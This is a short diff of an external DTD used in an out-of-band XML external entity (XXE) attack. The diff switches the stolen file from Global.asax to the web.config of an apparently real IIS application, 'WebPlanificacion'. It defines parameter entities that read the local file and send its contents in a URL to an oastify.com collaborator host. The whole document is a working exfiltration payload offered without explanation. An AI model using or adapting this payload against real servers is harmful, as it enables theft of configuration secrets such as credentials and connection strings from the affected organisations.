@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/inetpub/wwwroot/Global.asax">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://3y2bk6tc1744miappfuk6i4e45a0yqmf.oastify.com/?global_asax=%file;'>">
+<!ENTITY % file SYSTEM "file:///C:/inetpub/wwwroot/WebPlanificacion/web.config">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://3y2bk6tc1744miappfuk6i4e45a0yqmf.oastify.com/?webconfig_app=%file;'>">
 %eval;
 %exfil;
